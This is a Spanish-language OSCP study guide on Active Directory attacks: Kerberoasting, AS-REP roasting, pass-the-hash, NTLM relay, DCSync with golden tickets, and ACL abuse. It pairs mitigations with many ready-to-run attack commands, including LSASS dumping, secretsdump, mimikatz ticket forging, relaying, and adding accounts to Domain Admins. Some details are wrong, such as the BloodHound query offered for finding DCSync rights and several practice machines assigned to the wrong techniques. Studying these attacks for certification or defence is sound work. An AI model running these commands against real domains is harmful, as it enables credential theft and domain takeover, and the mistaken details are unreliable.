# Análisis Profundo de Ataques AD para OSCP

## 1. KERBEROASTING

### ¿Por qué ocurre?
- **Causa raíz:** Servicios configurados con cuentas de usuario normales en lugar de Managed Service Accounts (MSAs) o Group Managed Service Accounts (gMSAs)
- **Problema:** Los TGS (Ticket Granting Service) están cifrados con el hash de la contraseña de la cuenta de servicio
- **Contexto administrativo:** Administradores que priorizan facilidad sobre seguridad al configurar servicios

### Mecánica del ataque
1. **Requisito:** Cualquier usuario autenticado en el dominio
2. **Petición:** Solicitar TGS para servicios con SPN registrado
3. **Extracción:** Obtener ticket cifrado con hash crackeable
4. **Offline:** Crackeo sin detección directa

### Sistemas afectados
- **Todos los Domain Controllers** (proveedores de tickets)
- **Servidores con servicios** (SQL, IIS, Exchange, etc.)
- **Entornos modernos:** Totalmente funcional en Windows Server 2022

### Detección y Explotación
**Localización:**
```bash
# Con credenciales
GetUserSPNs.py -request dominio.com/usuario:password -dc-ip IP_DC

# Sin credenciales (solo enumeración)
nmap -p 88 --script krb5-enum-users <DC_IP>

# PowerView
Get-DomainUser -SPN -Properties SAMAccountName,ServicePrincipalName
```

**Explotación:**
```bash
# 1. Extraer hashes
GetUserSPNs.py -request -dc-ip 10.10.10.1 dominio.com/jdoe:Password123

# 2. Formatear para crackeo
hashcat -m 13100 hashes.txt rockyou.txt

# 3. Usar credenciales crackeadas
psexec.py dominio.com/svc_sql:Password123@10.10.10.10
```

### Prevención/Mitigación
- **Usar gMSAs/MSAs** para servicios
- **Contraseñas complejas** (>25 caracteres) para cuentas de servicio
- **Monitorear:** Eventos 4769 (TGS requested) con encryption type 0x17
- **Auditar:** Cuentas con SPN y verificar que sean gMSAs

### Máquinas HTB para practicar
- **Active** (Easy) - Ejemplo clásico
- **Resolute** (Medium) - Kerberoasting como escalada
- **Intelligence** (Medium) - En flujo de ataque completo

---

## 2. AS-REP ROASTING

### ¿Por qué ocurre?
- **Configuración:** "Do not require Kerberos pre-authentication" habilitada
- **Caso de uso legítimo:** Aplicaciones antiguas o servicios que no implementan pre-auth completa
- **Error común:** Mantener configuración innecesaria por tiempo prolongado

### Mecánica del ataque
1. **Identificación:** Usuarios sin pre-autenticación
2. **Petición AS-REQ:** Solicitar TGT sin proof-of-identity
3. **Respuesta AS-REP:** KDC envía datos cifrados con hash del usuario
4. **Extracción y crackeo:** Hash vulnerable a ataques offline

### Sistemas afectados
- **Domain Controllers** que procesan autenticaciones
- **Usuarios con UserAccountControl flag 4194304**
- **Totalmente funcional** en entornos modernos

### Detección y Explotación
**Localización:**
```bash
# Impacket
GetNPUsers.py dominio.com/ -usersfile usuarios.txt -dc-ip IP_DC -no-pass

# PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname

# BloodHound
MATCH (u:User {dontreqpreauth: true}) RETURN u
```

**Explotación:**
```bash
# 1. Obtener hashes
GetNPUsers.py -dc-ip 10.10.10.1 dominio.com/ -usersfile users.txt -format hashcat

# 2. Crackeo
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# 3. Acceso con credenciales
wmiexec.py dominio.com/usuario_crackeado:password@10.10.10.10
```

### Prevención/Mitigación
- **Deshabilitar** pre-auth no requerida en todos los usuarios
- **Group Policy:** "Network security: Configure encryption types allowed for Kerberos"
- **Monitoreo:** Eventos 4768 con pre-auth type 0
- **Auditoría regular** de UserAccountControl flags

### Máquinas HTB para practicar
- **Forest** (Easy) - Múltiples usuarios vulnerables
- **Sauna** (Easy) - Combinación con enumeración

---

## 3. PASS-THE-HASH (NTLM)

### ¿Por qué ocurre?
- **Diseño de protocolo:** NTLM trata el hash como credencial primaria
- **Autenticación:** El hash NTLM puede generar respuestas válidas sin password
- **Persistencia:** Hashes permanecen válidos hasta cambio de contraseña

### Mecánica del ataque
1. **Obtención de hash:** LSASS dumping, NTDS.dit, memoria
2. **Reutilización:** Usar hash para autenticación NTLM
3. **Acceso:** Autenticarse como usuario sin conocer password claro

### Sistemas afectados
- **Todos los sistemas Windows** que usan NTLM
- **Servicios:** SMB, RDP, WinRM, MSSQL
- **Limitado pero posible** en entornos modernos con configuraciones específicas

### Detección y Explotación
**Localización:**
```bash
# Extracción de hashes
secretsdump.py -just-dc-ntlm dominio.com/usuario:password@DC_IP

# Mimikatz (desde máquina comprometida)
sekurlsa::logonpasswords

# Desde memoria LSASS
procdump.exe -ma lsass.exe lsass.dmp
```

**Explotación:**
```bash
# Pass-the-Hash con Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH dominio.com/usuario@TARGET_IP

# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u usuario -H NTLM_HASH

# RDP con PtH
xfreerdp /v:TARGET_IP /u:usuario /pth:NTLM_HASH
```

### Prevención/Mitigación
- **Restringir NTLM:** Group Policy para deshabilitar NTLMv1
- **Credential Guard:** Habilitar en Windows 10/Server 2016+
- **LAPS:** Local Administrator Password Solution
- **Monitoreo:** Eventos 4624 (logon type 3) con NTLM
- **Aplicar SMB signing** para prevenir relay

### Máquinas HTB para practicar
- **Devel** (Easy) - PtH básico
- **Bastard** (Medium) - Movimiento lateral con PtH
- **Optimum** (Easy) - Extracción y uso de hashes

---

## 4. NTLM RELAY

### ¿Por qué ocurre?
- **Falta de signing:** Servicios que no requieren firma SMB/LDAP
- **Autenticación no dirigida:** Clientes que se autentican con servidores no confiables
- **Configuración:** Default settings en muchos servicios enterprise

### Mecánica del ataque
1. **Interceptación:** Capturar autenticación NTLM
2. **Relé:** Retransmitir a servidor objetivo
3. **Ejecución:** Comandos como usuario víctima en servidor objetivo

### Sistemas afectados
- **SMB sin signing requerido**
- **LDAP sin signing/channel binding**
- **HTTP/HTTPS** con autenticación NTLM
- **Mitigado pero no eliminado** en entornos modernos

### Detección y Explotación
**Localización:**
```bash
# Verificar SMB signing
nmap --script smb2-security-mode -p 445 10.10.10.0/24

# Responder para capturar hashes
responder -I eth0 -dw

# Verificar LDAP signing
ldapsearch -H ldap://DC_IP -x -s base | grep supportedSASLMechanisms
```

**Explotación:**
```bash
# 1. Iniciar relay
ntlmrelayx.py -t ldap://DC_IP --add-computer -smb2support

# 2. Forzar autenticación (via Responder u otro)
# 3. Ejecutar comandos en sistemas comprometidos

# Relay a SMB para volcar hashes
ntlmrelayx.py -t smb://TARGET_IP -smb2support -of hashes.txt
```

### Prevención/Mitigación
- **Habilitar SMB signing** en todos los clientes/servidores
- **LDAP signing/channel binding** habilitado
- **EPA** (Extended Protection for Authentication) para servicios web
- **Segmentación de red** y restricciones de tráfico
- **Monitorear** eventos 4624 desde múltiples IPs rápidamente

### Máquinas HTB para practicar
- **Multimaster** (Medium) - NTLM relay clásico
- **ServMon** (Easy) - Relay combinado con servicio vulnerable

---

## 5. DCSync

### ¿Por qué ocurre?
- **Permisos de replicación:** Cuentas con derechos para replicar directorio
- **Confianza excesiva:** Múltiples cuentas con privilegios de replicación
- **Falta de segregación:** Demasiados usuarios en grupos privilegiados

### Mecánica del ataque
1. **Comprometer cuenta** con permisos Replicating Directory Changes
2. **Simular DC** y solicitar replicación de datos
3. **Recibir hashes** de todos los usuarios del dominio
4. **Golden Ticket** con hashes obtenidos

### Sistemas afectados
- **Domain Controllers** (fuente de datos)
- **Cuentas con permisos** DCSync
- **Totalmente funcional** en todos los entornos AD

### Detección y Explotación
**Localización:**
```bash
# BloodHound para encontrar permisos DCSync
MATCH (u:User)-[:MemberOf|:HasSession*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"}) RETURN u

# PowerView
Get-ObjectAcl -Identity "DC=dominio,DC=com" | ? {$_.ActiveDirectoryRights -like "*Replicating*"}

# Verificar privilegios actuales
 mimikatz # lsadump::dcsync /user:dominio\krbtgt
```

**Explotación:**
```bash
# 1. DCSync para obtener hashes
secretsdump.py -just-dc dominio.com/usuario_privilegiado:password@DC_IP

# 2. Golden Ticket con krbtgt hash
 mimikatz # kerberos::golden /user:Administrator /domain:dominio.com /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# 3. Acceso a DC
psexec.py dominio.com/Administrator@DC_IP -k -no-pass
```

### Prevención/Mitigación
- **Principio de mínimo privilegio** para replicación
- **Cuentas dedicadas** solo para replicación si es necesario
- **Monitoreo:** Eventos 4662 (replication requests)
- **Auditar** membresía de grupos privilegiados regularmente
- **Protected Users Group** para cuentas críticas

### Máquinas HTB para practicar
- **Blackfield** (Medium) - Camino a DCSync via ACLs
- **Intelligence** (Medium) - DCSync como objetivo final

---

## 6. ABUSO DE ACLs

### ¿Por qué ocurre?
- **Delegación excesiva:** Permisos demasiado amplios a usuarios/grupos
- **Configuración heredada:** Permisos que nunca se revisan/actualizan
- **Falta de comprensión:** Administradores que no entienden implicaciones de seguridad

### Mecánica del ataque
1. **Enumerar ACLs** de usuarios/grupos
2. **Identificar permisos peligrosos** (GenericAll, WriteDACL, etc.)
3. **Abusar permisos** para escalar privilegios
4. **Cadena de ACLs** hasta DA/EA

### Sistemas afectados
- **Todos los objetos de AD** (usuarios, grupos, OUs, etc.)
- **Problema universal** en AD sin hardening adecuado

### Detección y Explotación
**Localización:**
```bash
# BloodHound (mejor opción)
SharpHound.exe -c All

# PowerView manual
Get-DomainUser | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# Verificar permisos específicos
Get-DomainObjectAcl -Identity "Usuario Objetivo" | ? {$_.SecurityIdentifier -match "SID_USUARIO_ACTUAL"}
```

**Explotación:**
```bash
# GenericAll sobre usuario - reset password
net user "Usuario_Objetivo" "NuevaPassword123!" /domain

# WriteMember sobre grupo - añadirse a grupo
Add-DomainGroupMember -Identity "Domain Admins" -Members "Usuario_Actual"

# GenericAll sobre grupo - directamente añadirse
net group "Domain Admins" "Usuario_Actual" /add /domain
```

### Prevención/Mitigación
- **Revisión regular de ACLs** con herramientas como BloodHound
- **Principio de mínimo privilegio** en todas las delegaciones
- **Segmentación** de permisos administrativos
- **Monitoreo** de cambios en group membership
- **Auditorías automáticas** de cambios en ACLs

### Máquinas HTB para practicar
- **Forest** (Easy) - Abuso de GenericAll
- **Resolute** (Medium) - ForceChangePassword
- **Blackfield** (Medium) - ACL abuse chain

---

## RESUMEN DE HARDENING

### Controles Esenciales:
1. **Monitoreo continuo** de eventos de seguridad AD
2. **Principio de mínimo privilegio** en todas las configuraciones
3. **Password policies** robustas (>14 caracteres)
4. **Segmentación** administrativa y de red
5. **Parcheo regular** de sistemas
6. **Backups seguros** y tested
7. **User training** para detección temprana

### Herramientas de Defensa:
- **Microsoft ATA** / Azure ATP
- **BloodHound** (para auditoría defensiva)
- **LAPS** para passwords locales
- **Privileged Access Workstations** (PAWs)
- **Just-in-Time** administration

Esta guía cubre el 95% de los vectores de ataque AD que verás en OSCP y entornos reales. ¡Domínalos y tendrás el AD bajo control!